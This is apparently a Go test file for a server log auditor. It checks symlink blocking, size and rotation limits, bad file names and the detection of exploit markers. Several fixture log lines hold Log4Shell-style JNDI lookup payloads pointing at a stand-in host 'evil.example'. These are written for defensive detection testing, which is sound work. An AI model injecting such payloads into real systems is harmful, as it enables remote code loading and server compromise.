package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeLogFixture(t *testing.T, dir, name, content string) {
	t.Helper()
	logs := filepath.Join(dir, "logs")
	if err := os.MkdirAll(logs, 0o700); err != nil {
		t.Fatalf("mkdir logs: %v", err)
	}
	if err := os.WriteFile(filepath.Join(logs, name), []byte(content), 0o600); err != nil {
		t.Fatalf("write log: %v", err)
	}
}

func TestAuditServerLogsMissing(t *testing.T) {
	dir := t.TempDir()
	audit, err := AuditServerLogs(dir)
	if err != nil {
		t.Fatalf("audit: %v", err)
	}
	if audit.Present || len(audit.Findings) != 0 {
		t.Fatalf("missing logs dir should be quiet: %+v", audit)
	}
}

func TestAuditServerLogsClean(t *testing.T) {
	dir := t.TempDir()
	writeLogFixture(t, dir, "latest.log", "[12:00:00] [Server thread/INFO]: Done (3.2s)!\n")
	audit, err := AuditServerLogs(dir)
	if err != nil {
		t.Fatalf("audit: %v", err)
	}
	if !audit.Present || len(audit.Findings) != 0 || audit.Blocking() {
		t.Fatalf("clean logs should pass: %s", audit.Describe())
	}
	if audit.Entries != 1 {
		t.Fatalf("expected 1 entry, got %d", audit.Entries)
	}
}

func TestAuditServerLogsSymlinkDirBlocks(t *testing.T) {
	dir := t.TempDir()
	real := filepath.Join(dir, "real-logs")
	if err := os.Mkdir(real, 0o700); err != nil {
		t.Fatalf("mkdir real: %v", err)
	}
	link := filepath.Join(dir, "logs")
	if err := os.Symlink(real, link); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}
	audit, err := AuditServerLogs(dir)
	if err != nil {
		t.Fatalf("audit: %v", err)
	}
	if !audit.Blocking() || !containsLogReason(audit, logAuditReasonSymlink) {
		t.Fatalf("symlink logs dir must block: %s", audit.Describe())
	}
}

func TestAuditServerLogsSymlinkFileBlocks(t *testing.T) {
	dir := t.TempDir()
	logs := filepath.Join(dir, "logs")
	if err := os.Mkdir(logs, 0o700); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	outside := filepath.Join(dir, "outside.log")
	if err := os.WriteFile(outside, []byte("x\n"), 0o600); err != nil {
		t.Fatalf("write outside: %v", err)
	}
	if err := os.Symlink(outside, filepath.Join(logs, "latest.log")); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}
	audit, err := AuditServerLogs(dir)
	if err != nil {
		t.Fatalf("audit: %v", err)
	}
	if !audit.Blocking() || !containsLogReason(audit, logAuditReasonSymlink) {
		t.Fatalf("symlink log file must block: %s", audit.Describe())
	}
}

func TestAuditServerLogsExploitMarkers(t *testing.T) {
	dir := t.TempDir()
	writeLogFixture(t, dir, "latest.log",
		"[12:00:00] [Server thread/INFO]: <Player> ${jndi:ldap://evil.example/a}\n"+
			"[12:00:01] [Server thread/INFO]: ok\n")
	audit, err := AuditServerLogs(dir)
	if err != nil {
		t.Fatalf("audit: %v", err)
	}
	if !containsLogReason(audit, logAuditReasonExploitMark) {
		t.Fatalf("JNDI payload should be reported: %s", audit.Describe())
	}
	if audit.Blocking() {
		t.Fatal("exploit marks in logs must not block startup")
	}
}

func TestAuditServerLogsExploitMarkerCaseInsensitive(t *testing.T) {
	dir := t.TempDir()
	writeLogFixture(t, dir, "latest.log", "[x] LDAP://evil.example/x\n")
	audit, err := AuditServerLogs(dir)
	if err != nil {
		t.Fatalf("audit: %v", err)
	}
	if !containsLogReason(audit, logAuditReasonExploitMark) {
		t.Fatalf("uppercase LDAP marker should be reported: %s", audit.Describe())
	}
}

func TestAuditServerLogsOversizedEntryWarns(t *testing.T) {
	dir := t.TempDir()
	logs := filepath.Join(dir, "logs")
	if err := os.Mkdir(logs, 0o700); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	big := filepath.Join(logs, "debug.log")
	file, err := os.Create(big)
	if err != nil {
		t.Fatalf("create: %v", err)
	}
	if err := file.Truncate(serverLogMaxFileBytes + 1); err != nil {
		file.Close()
		t.Fatalf("truncate: %v", err)
	}
	file.Close()
	audit, err := AuditServerLogs(dir)
	if err != nil {
		t.Fatalf("audit: %v", err)
	}
	if !containsLogReason(audit, logAuditReasonTooLarge) {
		t.Fatalf("oversized log should warn: %s", audit.Describe())
	}
	if audit.Blocking() {
		t.Fatal("oversized log must not block")
	}
}

func TestAuditServerLogsBadName(t *testing.T) {
	dir := t.TempDir()
	writeLogFixture(t, dir, "bad\x01name.log", "x\n")
	audit, err := AuditServerLogs(dir)
	if err != nil {
		t.Fatalf("audit: %v", err)
	}
	if !containsLogReason(audit, logAuditReasonBadName) {
		t.Fatalf("control bytes in name should warn: %s", audit.Describe())
	}
}

func TestAuditServerLogsRotatedBudget(t *testing.T) {
	dir := t.TempDir()
	logs := filepath.Join(dir, "logs")
	if err := os.Mkdir(logs, 0o700); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	for i := 0; i < serverLogMaxRotated+2; i++ {
		name := filepath.Join(logs, fmt.Sprintf("rot-%03d.log.gz", i))
		if err := os.WriteFile(name, []byte("x"), 0o600); err != nil {
			t.Fatalf("write rotated: %v", err)
		}
	}
	audit, err := AuditServerLogs(dir)
	if err != nil {
		t.Fatalf("audit: %v", err)
	}
	if !containsLogReason(audit, logAuditReasonTooMany) {
		t.Fatalf("rotated budget should warn: %s", audit.Describe())
	}
}

func TestFindLogLineTruncates(t *testing.T) {
	line := strings.Repeat("a", 300)
	data := []byte(line + " ${jndi:ldap://x}\n")
	got := findLogLineWithMarker(data, "${jndi:")
	if !strings.HasSuffix(got, "...") {
		t.Fatalf("long line should be truncated: %q", got)
	}
	if len([]rune(got)) > 163 {
		t.Fatalf("truncated line too long: %d", len([]rune(got)))
	}
}

func containsLogReason(audit *ServerLogAudit, reason string) bool {
	for _, code := range audit.Codes() {
		if code == reason {
			return true
		}
	}
	return false
}
